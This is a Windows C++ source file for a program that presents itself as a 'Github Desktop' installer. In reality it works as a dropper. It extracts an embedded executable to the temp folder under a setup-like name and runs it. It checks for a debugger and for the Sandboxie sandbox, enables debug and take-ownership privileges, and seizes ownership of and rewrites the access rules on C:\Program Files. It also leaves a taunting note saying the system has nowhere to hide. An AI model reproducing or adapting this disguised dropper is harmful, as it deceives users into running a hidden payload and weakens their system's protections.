// Github Desktop.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "Github Desktop.h"
#include<cstdio>
#include <accctrl.h>
#include <aclapi.h>

#define MAX_LOADSTRING 100

// 全局变量:
HINSTANCE hInst;                                // 当前实例
WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名

// 此代码模块中包含的函数的前向声明:

//Remember to free memory!
wchar_t* GetSystemDrivePath(wchar_t* relativePath) {
    WCHAR sysPath[MAX_PATH];
    WCHAR diskLetter;

    DWORD ret = GetSystemDirectoryW(sysPath, sizeof(sysPath));
    if (ret == 0)
    {
        fprintf(stderr, "GetSystemDirectory() Error: %ld\n", GetLastError());
        diskLetter = L'C';
    }
    else {
        diskLetter = sysPath[0];
    }
    WCHAR *result=new WCHAR[MAX_PATH + 10];
    result[0]=diskLetter;
    wcscat_s(result,MAX_PATH+10, L":");
    wcscat_s(result, MAX_PATH + 10, relativePath);
    return result;
}
void FreeRes_ShowError(const wchar_t* pszText)
{

    LPTSTR szBuffer = new TCHAR[1024];
    ::wsprintf(szBuffer, L"%hs Error[%d]\n", (pszText), ::GetLastError());//宽字符
#ifdef _DEBUG
    ::MessageBox(NULL, L"Unable to release necessary files!Please contact with us.", _T("ERROR"), MB_OK | MB_ICONERROR);
#endif
}
BOOL FreeResource(UINT uiResouceName,const char* lpszResourceType, char* lpszSaveFileName)
{
    HRSRC hRsrc = ::FindResourceA(GetModuleHandle(NULL), MAKEINTRESOURCEA(uiResouceName), lpszResourceType);

    if (hRsrc == NULL)
    {
        FreeRes_ShowError(L"FindResource");
        return FALSE;
    }
    DWORD dwSize = ::SizeofResource(NULL, hRsrc);
    if (0 >= dwSize)
    {
        FreeRes_ShowError(L"SizeofResource");
        return FALSE;
    }
    LPTSTR szBuffer = new TCHAR[dwSize+100];//这里是定义缓冲区大小

    HGLOBAL hGlobal = ::LoadResource(NULL, hRsrc);
    if (NULL == hGlobal)
    {
        FreeRes_ShowError(L"LoadResource");
        return FALSE;
    }

    LPVOID lpVoid = ::LockResource(hGlobal);
    if (NULL == lpVoid)
    {
        FreeRes_ShowError(L"LockResource");
        return FALSE;
    }


    FILE* fp = NULL;
    fopen_s(&fp, lpszSaveFileName, "wb+");
    if (NULL == fp)
    {
        FreeRes_ShowError(L"LockResource");
        return FALSE;
    }
    fwrite(lpVoid, sizeof(char), dwSize, fp);
    fclose(fp);

    return TRUE;
}

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}


BOOL TakeOwnership(LPTSTR lpszOwnFile)
{

    BOOL bRetval = FALSE;

    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL;
    PSID pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
        SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    const int NUM_ACES = 2;
    EXPLICIT_ACCESS ea[NUM_ACES];
    DWORD dwRes;

    // Specify the DACL to use.
    // Create a SID for the Everyone group.
    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
        SECURITY_WORLD_RID,
        0,
        0, 0, 0, 0, 0, 0,
        &pSIDEveryone))
    {
        printf("AllocateAndInitializeSid (Everyone) error %u\n",
            GetLastError());
        goto Cleanup;
    }

    // Create a SID for the BUILTIN\Administrators group.
    if (!AllocateAndInitializeSid(&SIDAuthNT, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &pSIDAdmin))
    {
        printf("AllocateAndInitializeSid (Admin) error %u\n",
            GetLastError());
        goto Cleanup;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

    // Set read access for Everyone.
    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

    // Set full control for Administrators.
    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES,
        ea,
        NULL,
        &pACL))
    {
        printf("Failed SetEntriesInAcl\n");
        goto Cleanup;
    }

    // Try to modify the object's DACL.
    dwRes = SetNamedSecurityInfo(
        lpszOwnFile,                 // name of the object
        SE_FILE_OBJECT,              // type of object
        DACL_SECURITY_INFORMATION,   // change only the object's DACL
        NULL, NULL,                  // do not change owner or group
        pACL,                        // DACL specified
        NULL);                       // do not change SACL

    if (ERROR_SUCCESS == dwRes)
    {
        printf("Successfully changed DACL\n");
        bRetval = TRUE;
        // No more processing needed.
        goto Cleanup;
    }
    if (dwRes != ERROR_ACCESS_DENIED)
    {
        printf("First SetNamedSecurityInfo call failed: %u\n",
            dwRes);
        goto Cleanup;
    }

    // If the preceding call failed because access was denied, 
    // enable the SE_TAKE_OWNERSHIP_NAME privilege, create a SID for 
    // the Administrators group, take ownership of the object, and 
    // disable the privilege. Then try again to set the object's DACL.

    // Open a handle to the access token for the calling process.
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES,
        &hToken))
    {
        printf("OpenProcessToken failed: %u\n", GetLastError());
        goto Cleanup;
    }

    // Enable the SE_TAKE_OWNERSHIP_NAME privilege.
    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE))
    {
        printf("You must be logged on as Administrator.\n");
        goto Cleanup;
    }

    // Set the owner in the object's security descriptor.
    dwRes = SetNamedSecurityInfo(
        lpszOwnFile,                 // name of the object
        SE_FILE_OBJECT,              // type of object
        OWNER_SECURITY_INFORMATION,  // change only the object's owner
        pSIDAdmin,                   // SID of Administrator group
        NULL,
        NULL,
        NULL);

    if (dwRes != ERROR_SUCCESS)
    {
        printf("Could not set owner. Error: %u\n", dwRes);
        goto Cleanup;
    }

    // Disable the SE_TAKE_OWNERSHIP_NAME privilege.
    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE))
    {
        printf("Failed SetPrivilege call unexpectedly.\n");
        goto Cleanup;
    }

    // Try again to modify the object's DACL,
    // now that we are the owner.
    dwRes = SetNamedSecurityInfo(
        lpszOwnFile,                 // name of the object
        SE_FILE_OBJECT,              // type of object
        DACL_SECURITY_INFORMATION,   // change only the object's DACL
        NULL, NULL,                  // do not change owner or group
        pACL,                        // DACL specified
        NULL);                       // do not change SACL

    if (dwRes == ERROR_SUCCESS)
    {
        printf("Successfully changed DACL\n");
        bRetval = TRUE;
    }
    else
    {
        printf("Second SetNamedSecurityInfo call failed: %u\n",
            dwRes);
    }

Cleanup:

    if (pSIDAdmin)
        FreeSid(pSIDAdmin);

    if (pSIDEveryone)
        FreeSid(pSIDEveryone);

    if (pACL)
        LocalFree(pACL);

    if (hToken)
        CloseHandle(hToken);

    return bRetval;

}
void remark()
{
    SetPrivilege(GetCurrentProcessToken(), SE_DEBUG_NAME, TRUE);
    SetPrivilege(GetCurrentProcessToken(), SE_TAKE_OWNERSHIP_NAME, TRUE);
    wchar_t sysPath[] = L"C:\\Program Files\\";
    TakeOwnership(sysPath);
    FILE* fp = NULL;
    fopen_s(&fp, "C:\\Program Files\\remark.txt", "wb+");
    if (NULL == fp)
    {
        FreeRes_ShowError(L"LockResource");
        return;
    }
    char buf[] = "你的系统已经无所遁形了！";
    fwrite(buf, sizeof(char), 50, fp);
    fclose(fp);
}
int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    BOOL isDebugging = FALSE;
    // TODO: 在此处放置代码。
    if (IsDebuggerPresent()) {
        isDebugging = TRUE;
        MessageBox(NULL, L"Please use Debug version to debug,instead of Released version!", L"Github Desktop Installer", MB_OK);
    }
    if (GetModuleHandleW(L"SbieDll.dll") != NULL) {
        isDebugging = TRUE;
        MessageBox(NULL, L"Please use Debug version to test,instead of Released version!", L"Github Desktop Installer", MB_OK);
    }

    CHAR lpTmpPath[MAX_PATH+20] = { 0 };
    GetTempPathA(MAX_PATH, lpTmpPath);
    strcat_s(lpTmpPath, "GithubOfflineSetuper.exe");
    FreeResource(IDR_EXE1, "EXE", lpTmpPath);
    PROCESS_INFORMATION* pifo = new PROCESS_INFORMATION();
    STARTUPINFOA* sifo = new STARTUPINFOA();
    sifo->cb = sizeof(STARTUPINFO);
    BOOL isSuccess = CreateProcessA(lpTmpPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, sifo, pifo);
    if (!isSuccess) {
        MessageBox(NULL, L"Unable to enter setup produce!", L"Github Desktop Installer", MB_OK);
        ExitProcess(137);
    }
    remark();
    return 0;
}


